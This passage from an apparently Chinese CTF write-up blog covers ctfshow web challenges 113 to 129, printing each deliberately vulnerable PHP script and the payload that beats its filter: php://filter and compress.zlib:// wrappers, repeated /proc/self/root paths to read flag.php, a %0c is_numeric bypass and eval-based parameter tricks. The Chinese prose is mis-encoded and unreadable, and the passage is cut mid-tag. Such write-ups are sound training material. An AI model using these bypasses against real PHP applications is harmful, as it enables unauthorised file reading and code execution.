class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:52</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p> compress.zlib://file.gz - å¤„ç†çš„æ˜¯ â€˜.gzâ€™ åç¼€çš„å‹ç¼©åŒ…<br>    compress.bzip2://file.bz2 - å¤„ç†çš„æ˜¯ â€˜.bz2â€™ åç¼€çš„å‹ç¼©åŒ…<br>    zip://archive.zip#dir/file.txt - å¤„ç†çš„æ˜¯ â€˜.zipâ€™ åç¼€çš„å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶</p></blockquote><p>   ç”¨ä¸Šä¸€é¢˜çš„éé¢„æœŸè§£ï¼š?file=compress.zlib://flag.php<br>é¢„æœŸè§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸­/proc/self/rootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ls /proc/self/rootï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹<br>å¤šæ¬¡é‡å¤ä»è€Œç»•è¿‡çš„åŸç†ä¸æ‡‚ï¼</p><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>filteræ²¡æœ‰è¿‡æ»¤ï¼ï¼</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è€ƒis_numericï¼ˆï¼‰å’Œtrimï¼ˆï¼‰è¿‡æ»¤<br>trimï¼ˆï¼‰ï¼šåŒ¹é…å­—ç¬¦ä¸²<br>åšä¸ªå®éªŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(is_numeric(<span class="variable">$x</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœæœ‰é™¤äº†æ•°å­—å’Œ+-.å·ä»¥å¤–è¿˜æœ‰ %09 %0a %0b %0c %0d %20</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(trim(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœæœ‰+-.å·ä»¥å¤–è¿˜æœ‰åªå‰©ä¸‹%0cä¹Ÿå°±æ˜¯æ¢é¡µç¬¦<br>åˆ™åªæœ‰%0cå¯ä»¥åŒæ—¶ç»•è¿‡ä¸¤ä¸ªå‡½æ•°<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%<span class="number">0</span>c36</span><br></pre></td></tr></table></figure><h2 id="web123ã€125ã€126"><a href="#web123ã€125ã€126" class="headerlink" title="web123ã€125ã€126"></a>web123ã€125ã€126</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ¬é¢˜ï¼Œå‘ç°é¦–å…ˆä¸€ä¸ªéš¾ç‚¹å°±æ˜¯è®©CTF_SHOW.COMç»•è¿‡åŒ¹é…ï¼Œçœ‹åˆ°å¤§ä½¬åšå®¢åå‘ç°CTF[SHOW.COMå¯ä»¥ç»•è¿‡ã€‚ä¹‹åæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ã€webç½‘é¡µæ¨¡å¼ä¸‹</span><br><span class="line"></span><br><span class="line">åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹</span><br><span class="line"></span><br><span class="line">    è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ<span class="variable">$_SERVER</span>[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ</span><br><span class="line"></span><br><span class="line">    è¿™æ—¶å€™çš„<span class="variable">$_SERVER</span>[â€˜argvâ€™][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[â€˜QUERY_STRINGâ€™]</span><br><span class="line"></span><br><span class="line">    <span class="variable">$argv</span>,<span class="variable">$argc</span>åœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºæœ¬é¢˜æ˜¯åœ¨webæ¡ä»¶ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[â€˜argvâ€™][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[â€˜QUERY_STRINGâ€™]<span class="comment">//å³a[0]=$_SERVER[â€˜QUERY_STRINGâ€™]</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html">$_SERVER[â€˜QUERY_STRINGâ€™]çš„ç”¨æ³•</a><br>å› æ­¤å¯ä»¥æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="variable">$fl0g</span>=flag_give_me;</span><br><span class="line">POST  CTF_SHOW=<span class="number">1</span>&amp;CTF[SHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ¬é¢˜åå‘ç°å’Œä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯è¦ç»•è¿‡åŒ¹é…çš„_</p><blockquote><p>extractï¼ˆ$arrayï¼‰ï¼šå°†æ•°ç»„ä¸­çš„é”®ã€å€¼ å˜æˆ å˜é‡å’Œå€¼</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf%<span class="number">5</span>bshow=ilove36d</span><br><span class="line">ctf show=ilove36d</span><br></pre></td></tr></table></figure><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-12 19:49:05</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ¬é¢˜åä¸€è„¸æ‡µï¼Œçœ‹å¤§ä½¬åšå®¢</p><blockquote><p>call_user_func() ï¼š è¯¥å‡½æ•°â€æ˜¯â€â€PHPâ€â€ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè°ƒç”¨ç¬¬ä¸€ä¸ªå‚æ•°ç»™å‡ºçš„å›è°ƒï¼Œå¹¶å°†å…¶ä½™å‚æ•°ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å®ƒç”¨äºè°ƒç”¨ç”¨æˆ·å®šä¹‰çš„å‡½æ•°ã€‚â€</p></blockquote><p>åœ¨å¼€å¯gettextæ‹“å±•åï¼Œæœ‰_()==gettext()   ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll<br>åœ¨å¼€å¯è¯¥æ‹“å±•å _() ç­‰æ•ˆäº gettext()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">ç»“æœ  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">ç»“æœ phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ call_user_func(â€˜_â€™,â€™phpinfoâ€™) è¿”å›çš„å°±æ˜¯phpinfo<br>å› ä¸ºæˆ‘ä»¬è¦å¾—åˆ°çš„flagå°±åœ¨flag.phpä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨get_defined_vars</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars ( <span class="keyword">void</span> ) : <span class="keyword">array</span></span><br><span class="line">æ­¤å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</span><br></pre></td></tr></table></figure><p>åˆ™payloadï¼š?f1=_&amp;&amp;f2=get_defined_vars</p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>stripos()ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</p></blockquote><p>å¯ä»¥ç”¨æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«æˆ–è€…ç”¨ä¼ªåè®®<br>filterä¼ªåè®®æ”¯æŒå¤šç§ç¼–ç æ–¹å¼ï¼Œæ— æ•ˆçš„å°±è¢«å¿½ç•¥æ‰äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>ç›®å½•ç©¿è¶Šä¹Ÿå¯ä»¥ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 